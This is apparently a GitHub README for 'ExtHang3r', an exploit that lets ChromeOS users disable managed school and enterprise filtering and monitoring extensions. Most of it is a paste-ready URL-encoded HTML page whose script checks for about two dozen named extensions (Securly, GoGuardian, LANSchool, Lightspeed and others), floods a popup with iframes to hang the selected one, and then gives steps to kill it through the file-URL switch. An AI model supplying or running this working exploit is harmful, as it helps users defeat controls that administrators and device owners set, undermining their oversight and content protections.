# ExtHang3r - Made by Blobby-Boi

## What is it?
ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of June 2024.

## How does it work?
This exploit works very similar to another exploit, <b>Dextensify</b>. The main difference is that instead of creating iframes and slowly getting rid of them, it creates a separate popup window that spams iframes and refreshes them. After a few seconds, the popup is closed achieving similar behavior to the <b>LTMEAT Flood</b> method. The only problem is that for whatever reason this hang wouldn't let you disable the extension with the file URL's switch, but that can easily be fixed by just attempting to open any of the extension's pages (in this case, manifest.json).

## How do I use it?
To use the exploit, paste the following url into your url bar. More detailed instructions are provided in the exploit's page.
```
data:text/html;charset=utf-8,%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%3Ctitle%3EExtHang3r%3C%2Ftitle%3E%0A%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image%2Fpng%22%20href%3D%22https%3A%2F%2Fraw.githubusercontent.com%2FBlobby-Boi%2FExtHang3r%2Fmain%2Ffavicon.png%22%3E%0A%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DVarela%2BRound%26display%3Dswap%22%3E%0A%20%20%3Cstyle%3E%0A%20%20%20%20body%20%7B%0A%20%20%20%20%20%20font-family%3A%20'Varela%20Round'%2C%20sans-serif%3B%0A%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20background-color%3A%20%23f8f9fa%3B%0A%20%20%20%20%20%20color%3A%20%23333%3B%0A%20%20%20%20%7D%0A%20%20%20%20header%20%7B%0A%20%20%20%20%20%20background-color%3A%20%23343a40%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20padding%3A%2010px%2020px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20box-shadow%3A%200%202px%205px%20rgba(0%2C%200%2C%200%2C%200.1)%3B%0A%20%20%20%20%7D%0A%20%20%20%20.logo%20%7B%0A%20%20%20%20%20%20width%3A%2050px%3B%0A%20%20%20%20%20%20height%3A%2050px%3B%0A%20%20%20%20%20%20margin-right%3A%2010px%3B%0A%20%20%20%20%7D%0A%20%20%20%20.container%20%7B%0A%20%20%20%20%20%20max-width%3A%20800px%3B%0A%20%20%20%20%20%20margin%3A%20150px%20auto%200%20auto%3B%0A%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20background%3A%20%23fff%3B%0A%20%20%20%20%20%20box-shadow%3A%200%204px%208px%20rgba(0%2C%200%2C%200%2C%200.1)%3B%0A%20%20%20%20%20%20border-radius%3A%208px%3B%0A%20%20%20%20%7D%0A%20%20%20%20select%20%7B%0A%20%20%20%20%20%20font-family%3A%20'Varela%20Round'%2C%20sans-serif%3B%0A%20%20%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20%20%20border%3A%201px%20solid%20%23ced4da%3B%0A%20%20%20%20%20%20border-radius%3A%204px%3B%0A%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%7D%0A%20%20%20%20button%20%7B%0A%20%20%20%20%20%20font-family%3A%20'Varela%20Round'%2C%20sans-serif%3B%0A%20%20%20%20%20%20background-color%3A%20%23007bff%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20padding%3A%2010px%2020px%3B%0A%20%20%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%20%20border-radius%3A%205px%3B%0A%20%20%20%20%20%20margin-top%3A%2010px%3B%0A%20%20%20%20%20%20transition%3A%20background-color%200.3s%20ease%3B%0A%20%20%20%20%7D%0A%20%20%20%20button%3Ahover%20%7B%0A%20%20%20%20%20%20background-color%3A%20%230056b3%3B%0A%20%20%20%20%7D%0A%20%20%20%20.overlay%20%7B%0A%20%20%09%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20background-color%3A%20rgba(0%2C%200%2C%200%2C%200.7)%3B%0A%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20z-index%3A%209999%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20font-size%3A%2024px%3B%0A%20%20%20%20%20%20user-select%3A%20none%3B%0A%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%7D%0A%20%20%20%20.spinner%20%7B%0A%20%20%20%20%20%20border%3A%206px%20solid%20rgba(255%2C%20255%2C%20255%2C%200.3)%3B%0A%20%20%20%20%20%20border-top%3A%206px%20solid%20%23fff%3B%0A%20%20%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20%20%20width%3A%2040px%3B%0A%20%20%20%20%20%20height%3A%2040px%3B%0A%20%20%20%20%20%20animation%3A%20spin%201s%20linear%20infinite%3B%0A%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20spin%20%7B%0A%20%20%20%20%20%200%25%20%7B%20transform%3A%20rotate(0deg)%3B%20%7D%0A%20%20%20%20%20%20100%25%20%7B%20transform%3A%20rotate(360deg)%3B%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20%23killExtensionText%20%7B%0A%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20%20%20color%3A%20%23333%3B%0A%20%20%20%20%20%20font-size%3A%2018px%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20background%3A%20%23e9ecef%3B%0A%20%20%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20%20%20border-radius%3A%208px%3B%0A%20%20%20%20%20%20box-shadow%3A%200%204px%208px%20rgba(0%2C%200%2C%200%2C%200.1)%3B%0A%20%20%20%20%7D%0A%20%20%20%20footer%20%7B%0A%20%20%20%20%20%20background-color%3A%20%23343a40%3B%0A%20%20%20%20%20%20color%3A%20%23fff%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%20%20position%3A%20fixed%3B%0A%20%20%20%20%20%20bottom%3A%200%3B%0A%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%7D%0A%20%20%20%20footer%20a%20%7B%0A%20%20%20%20%20%20color%3A%20%23007bff%3B%0A%20%20%20%20%20%20text-decoration%3A%20none%3B%0A%20%20%20%20%7D%0A%20%20%20%20footer%20a%3Ahover%20%7B%0A%20%20%20%20%20%20text-decoration%3A%20underline%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%0A%3Cheader%3E%0A%20%20%3Cimg%20src%3D%22https%3A%2F%2Fblobby-boi.github.io%2FBlobbypassXSS%2Ffavicon.png%22%20alt%3D%22Logo%22%20class%3D%22logo%22%3E%0A%20%20%3Ch1%3EExtHang3r%3C%2Fh1%3E%0A%3C%2Fheader%3E%0A%0A%3Cdiv%20class%3D%22container%22%3E%0A%20%20%3Cp%3EExtHang3r%20is%20an%20exploit%20that%20allows%20ChromeOS%20users%20to%20kill%20extensions%20after%20the%20LTMEAT%20patch.%20It%20remains%20unpatched%20in%20all%20new%20ChromeOS%20versions%20as%20of%20June%202024.%3C%2Fp%3E%0A%20%20%3Clabel%20for%3D%22iframeSelect%22%3ESelect%20extension%3A%3C%2Flabel%3E%0A%20%20%3Cselect%20id%3D%22iframeSelect%22%3E%0A%20%20%3C%2Fselect%3E%0A%20%20%3Cbutton%20onclick%3D%22warning()%3B%22%20id%3D%22hangButton%22%3EHang%20Extension!%3C%2Fbutton%3E%0A%3C%2Fdiv%3E%0A%0A%3Cdiv%20class%3D%22overlay%22%20id%3D%22overlay%22%3E%0A%20%20%3Cdiv%20class%3D%22spinner%22%3E%3C%2Fdiv%3E%0A%20%20Hanging...%20(This%20will%20take%20about%2030%20seconds)%0A%3C%2Fdiv%3E%0A%3Cdiv%20id%3D%22killExtensionText%22%3E%3C%2Fdiv%3E%0A%0A%3Cfooter%3E%0A%20%20%3Cp%3EMade%20by%20%3Ca%20href%3D%22https%3A%2F%2Fgithub.com%2FBlobby-Boi%2F%22%3EBlobby%20Boi%3C%2Fa%3E%3C%2Fp%3E%0A%3C%2Ffooter%3E%0A%0A%3Cscript%3E%0A%20%20async%20function%20checkExtensionURL(url)%20%7B%0A%20%20%20%20try%20%7B%0A%20%20%20%20%20%20const%20response%20%3D%20await%20fetch(url)%3B%0A%20%20%20%20%20%20if%20(response.ok)%20%7B%0A%20%20%20%20%20%20%20%20return%20true%3B%0A%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%20catch%20(error)%20%7B%0A%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%0A%20%20async%20function%20populateSelectOptions()%20%7B%0A%20%20%20%20const%20selectElement%20%3D%20document.getElementById(%22iframeSelect%22)%3B%0A%20%20%20%20const%20extensions%20%3D%20%7B%0A%20%20%20%20%20%20%22Securly%22%3A%20%22chrome-extension%3A%2F%2Fjoflmkccibkooplaeoinecjbmdebglab%2Ffonts%2FMetropolis.css%22%2C%0A%20%20%20%20%20%20%22Securly%20(old)%22%3A%20%22chrome-extension%3A%2F%2Fiheobagjkfklnlikgihanlhcddjoihkg%2Ffonts%2FMetropolis.css%22%2C%0A%20%20%20%20%20%20%22GoGuardian%22%3A%20%22chrome-extension%3A%2F%2Fhaldlgldplgnggkjaafhelgiaglafanh%2Fyoutube_injection.js%22%2C%0A%20%20%20%20%20%20%22LANSchool%22%3A%20%22chrome-extension%3A%2F%2Fbaleiojnjpgeojohhhfbichcodgljmnj%2Fblocked.html%22%2C%0A%20%20%20%20%20%20%22Linewize%22%3A%20%22chrome-extension%3A%2F%2Fddfbkhpmcdbciejenfcolaaiebnjcbfc%2Fbackground%2Fassets%2Fpages%2Fdefault-blocked.html%22%2C%0A%20%20%20%20%20%20%22Blocksi%22%3A%20%22chrome-extension%3A%2F%2Fghlpmldmjjhmdgmneoaibbegkjjbonbk%2Fpages%2FblockPage.html%22%2C%0A%20%20%20%20%20%20%22FortiGuard%22%3A%20%22chrome-extension%3A%2F%2Figbgpehnbmhgdgjbhkkpedommgmfbeao%2Fyoutube_injection.js%22%2C%0A%20%20%20%20%20%20%22Cisco%20Umbrella%22%3A%20%22chrome-extension%3A%2F%2Fjcdhmojfecjfmbdpchihbeilohgnbdci%2Fblocked.html%22%2C%0A%20%20%20%20%20%20%22ContentKeeper%22%3A%20%22chrome-extension%3A%2F%2Fjdogphakondfdmcanpapfahkdomaicfa%2Fimg%2Fckauth19x.png%22%2C%0A%20%20%20%20%20%20%22CK-Authenticator%20G3%22%3A%20%22chrome-extension%3A%2F%2Fodoanpnonilogofggaohhkdkdgbhdljp%2Fimg%2Fckauth19x.png%22%2C%0A%20%20%20%20%20%20%22Securly%20Classroom%22%3A%20%22chrome-extension%3A%2F%2Fjfbecfmiegcjddenjhlbhlikcbfmnafd%2Fnotfound.html%22%2C%0A%20%20%20%20%20%20%22Hapara%22%3A%20%22chrome-extension%3A%2F%2Fkbohafcopfpigkjdimdcdgenlhkmhbnc%2Fblocked.html%22%2C%0A%20%20%20%20%20%20%22Hapara%20(new%20ID)%22%3A%20%22chrome-extension%3A%2F%2Faceopacgaepdcelohobicpffbbejnfac%2Fblocked.html%22%2C%0A%20%20%20%20%20%20%22iboss%22%3A%20%22chrome-extension%3A%2F%2Fkmffehbidlalibfeklaefnckpidbodff%2Frestricted.html%22%2C%0A%20%20%20%20%20%20%22Lightspeed%20Filter%20Agent%22%3A%20%22chrome-extension%3A%2F%2Fadkcpkpghahmbopkjchobieckeoaoeem%2Ficon-128.png%22%2C%0A%20%20%20%20%20%20%22Lightspeed%20Classroom%22%3A%20%22chrome-extension%3A%2F%2Fkkbmdgjggcdajckdlbngdjonpchpaiea%2Fassets%2Ficon-classroom-128.png%22%2C%0A%20%20%20%20%20%20%22InterCLASS%20Filtering%20Service%22%3A%20%22chrome-extension%3A%2F%2Fjbddgjglgkkneonnineaohdhabjbgopi%2Fpages%2Fmessage-page.html%22%2C%0A%20%20%20%20%20%20%22InterSafe%20GatewayConnection%20Agent%22%3A%20%22chrome-extension%3A%2F%2Fecjoghccnjlodjlmkgmnbnkdcbnjgden%2Fresources%2Foptions.js%22%2C%0A%20%20%20%20%20%20%22LoiLo%20Web%20Filters%22%3A%20%22chrome-extension%3A%2F%2Fpabjlbjcgldndnpjnokjakbdofjgnfia%2Fimage%2Fallow_icon%2Fshield_green_128x128.png%22%2C%0A%20%20%20%20%20%20%22Gopher%20Buddy%22%3A%20%22chrome-extension%3A%2F%2Fcgbbbjmgdpnifijconhamggjehlamcif%2Fimages%2Fgopher-buddy_128x128_color.png%22%2C%0A%20%20%20%20%20%20%22LanSchool%20Web%20Helper%22%3A%20%22chrome-extension%3A%2F%2Fhonjcnefekfnompampcpmcdadibmjhlk%2Fblocked.html%22%2C%0A%20%20%20%20%20%20%22IMTLazarus%22%3A%20%22chrome-extension%3A%2F%2Fcgigopjakkeclhggchgnhmpmhghcbnaf%2Fmodels%2Fmodel.json%22%2C%0A%20%20%20%20%20%20%22Impero%20Backdrop%22%3A%20%22chrome-extension%3A%2F%2Fjjpmjccpemllnmgiaojaocgnakpmfgjg%2Flicenses.html%22%2C%0A%20%20%20%20%20%20%22Mobile%20Guardian%22%3A%20%22chrome-extension%3A%2F%2Ffgmafhdohjkdhfaacgbgclmfgkgokgmb%2Fblock.html%22%0A%20%20%20%20%7D%3B%0A%20%20%20%20%0A%20%20%20%20let%20hasSupportedExtensions%20%3D%20false%3B%0A%0A%20%20%20%20for%20(const%20%5Bname%2C%20url%5D%20of%20Object.entries(extensions))%20%7B%0A%20%20%20%20%20%20if%20(await%20checkExtensionURL(url))%20%7B%0A%20%20%20%20%20%20%20%20const%20option%20%3D%20document.createElement(%22option%22)%3B%0A%20%20%20%20%20%20%20%20option.value%20%3D%20url%3B%0A%20%20%20%20%20%20%20%20option.textContent%20%3D%20name%3B%0A%20%20%20%20%20%20%20%20selectElement.appendChild(option)%3B%0A%20%20%20%20%20%20%20%20hasSupportedExtensions%20%3D%20true%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20if%20(!hasSupportedExtensions)%20%7B%0A%20%20%20%20%20%20const%20option%20%3D%20document.createElement(%22option%22)%3B%0A%20%20%20%20%20%20option.value%20%3D%20%22%22%3B%0A%20%20%20%20%20%20option.textContent%20%3D%20%22No%20supported%20extensions%20installed%22%3B%0A%20%20%20%20%20%20selectElement.appendChild(option)%3B%0A%20%20%20%20%20%20document.getElementById(%22hangButton%22).style.display%20%3D%20%22none%22%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%0A%20%20populateSelectOptions()%3B%0A%20%20%0A%20%20function%20replaceIframes(container%2C%20iframeSrc)%20%7B%0A%20%20%20%20for%20(var%20i%20%3D%200%3B%20i%20%3C%2050%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20var%20iframe%20%3D%20document.createElement('iframe')%3B%0A%20%20%20%20%20%20iframe.src%20%3D%20iframeSrc%3B%0A%20%20%20%20%20%20iframe.style.width%20%3D%20'100%25'%3B%0A%20%20%20%20%20%20iframe.style.height%20%3D%20'100px'%3B%0A%20%20%20%20%20%20container.appendChild(iframe)%3B%0A%20%20%20%20%7D%0A%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20while%20(container.firstChild)%20%7B%0A%20%20%20%20%20%20%20%20container.removeChild(container.firstChild)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20replaceIframes(container%2C%20iframeSrc)%3B%0A%20%20%20%20%7D%2C%2050)%3B%0A%20%20%7D%0A%0A%20%20function%20warning()%20%7B%0A%20%20%20%20var%20overlay%20%3D%20document.getElementById(%22overlay%22)%3B%0A%20%20%20%20overlay.style.display%20%3D%20%22flex%22%3B%0A%20%20%20%20var%20iframeSelect%20%3D%20document.getElementById(%22iframeSelect%22)%3B%0A%20%20%20%20var%20selectedOption%20%3D%20iframeSelect.options%5BiframeSelect.selectedIndex%5D.text%3B%0A%20%20%20%20var%20selectedSrc%20%3D%20iframeSelect.value%3B%0A%20%20%20%20var%20popup%20%3D%20window.open(%22%22%2C%20%22PopupWindow%22%2C%20%22width%3D100%2Cheight%3D100%22)%3B%0A%20%20%20%20var%20popupDocument%20%3D%20popup.document%3B%0A%20%20%20%20var%20popupBody%20%3D%20popupDocument.body%3B%0A%20%20%20%20var%20iframeContainer%20%3D%20popupDocument.createElement('div')%3B%0A%20%20%20%20iframeContainer.id%20%3D%20'iframeContainer'%3B%0A%20%20%20%20popupBody.appendChild(iframeContainer)%3B%0A%20%20%20%20replaceIframes(iframeContainer%2C%20selectedSrc)%3B%0A%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20popup.close()%3B%0A%20%20%20%20%20%20var%20extensionId%20%3D%20selectedSrc.substring(selectedSrc.indexOf(%22%2F%2F%22)%20%2B%202%2C%20selectedSrc.indexOf(%22%2F%22%2C%20selectedSrc.indexOf(%22%2F%2F%22)%20%2B%202))%3B%0A%20%20%20%20%20%20var%20extensionURL%20%3D%20%22chrome-extension%3A%2F%2F%22%20%2B%20extensionId%3B%0A%20%20%20%20%20%20var%20killExtensionText%20%3D%20document.getElementById(%22killExtensionText%22)%3B%0A%20%20%20%20%20%20killExtensionText.innerHTML%20%3D%20%22Now%20that%20the%20extension%20%22%20%2B%20selectedOption%20%2B%20%22%20has%20been%20hanged%2C%20open%20a%20new%20tab%20and%20go%20to%20%3Cstrong%3E%22%20%2B%20extensionURL%20%2B%20%22%2Fmanifest.json%3C%2Fstrong%3E%20(that%20tab%20should%20infinitely%20keep%20loading).%20Make%20sure%20to%20keep%20that%20tab%20open%20and%20then%20in%20another%20tab%20open%20%3Cstrong%3Echrome%3A%2F%2Fextensions%2F%3Fid%3D%22%20%2B%20extensionId%20%2B%20%22%3C%2Fstrong%3E%20Flip%20the%20allow%20access%20to%20file%20URLs%20switch%20twice.%20Now%20you%20can%20press%20Ctrl%2BW%20three%20times%20to%20close%20all%20of%20the%20tabs.%20If%20you%20want%20to%20restore%20the%20extension%2C%20flip%20the%20allow%20access%20to%20file%20URLs%20switch%20again.%22%3B%0A%20%20%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20%20%20overlay.style.display%20%3D%20%22none%22%3B%0A%20%20%20%20%20%20%20%20killExtensionText.style.display%20%3D%20%22block%22%3B%0A%20%20%20%20%20%20%7D%2C%205000)%3B%0A%20%20%20%20%7D%2C%2030000)%3B%0A%20%20%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E
```
